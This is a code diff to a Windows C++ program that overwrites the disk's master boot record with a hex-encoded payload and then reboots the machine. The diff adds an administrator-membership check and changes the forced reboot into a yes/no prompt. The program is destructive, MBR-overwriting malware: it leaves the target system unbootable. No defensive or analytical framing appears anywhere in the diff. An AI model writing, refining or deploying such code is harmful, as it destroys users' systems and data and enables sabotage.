@@ -14,6 +14,17 @@ std::vector<unsigned char> HexToBytes(const std::string& hex) {
     return bytes;
 }
 
+bool IsAdmin() {
+    BOOL isAdmin = FALSE;
+    PSID adminGroup = NULL;
+    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
+    if (AllocateAndInitializeSid(&ntAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &adminGroup)) {
+        CheckTokenMembership(NULL, adminGroup, &isAdmin);
+        FreeSid(adminGroup);
+    }
+    return isAdmin == TRUE;
+}
+
 void WriteMBR() {
     std::string hex(MBR_HEX);
     std::vector<unsigned char> mbr = HexToBytes(hex);
@@ -46,20 +57,25 @@ void WriteMBR() {
     }
     
     CloseHandle(hDisk);
-    MessageBoxA(NULL, "MBR successfully overwritten!\nSystem will restart.", "Success", MB_OK | MB_ICONINFORMATION);
     
-    HANDLE hToken;
-    TOKEN_PRIVILEGES tkp;
-    OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
-    LookupPrivilegeValueA(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid);
-    tkp.PrivilegeCount = 1;
-    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
-    AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, NULL, 0);
-    ExitWindowsEx(EWX_REBOOT, SHTDN_REASON_MAJOR_OTHER);
+    int result = MessageBoxA(NULL, 
+        "MBR successfully overwritten!\n\nRestart system now?", 
+        "Success", MB_YESNO | MB_ICONINFORMATION);
+    
+    if (result == IDYES) {
+        HANDLE hToken;
+        TOKEN_PRIVILEGES tkp;
+        OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
+        LookupPrivilegeValueA(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid);
+        tkp.PrivilegeCount = 1;
+        tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+        AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, NULL, 0);
+        ExitWindowsEx(EWX_REBOOT, SHTDN_REASON_MAJOR_OTHER);
+    }
 }
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
-    if (!IsUserAnAdmin()) {
+    if (!IsAdmin()) {
         MessageBoxA(NULL, "Please run as Administrator!", "Error", MB_OK | MB_ICONERROR);
         return 1;
     }
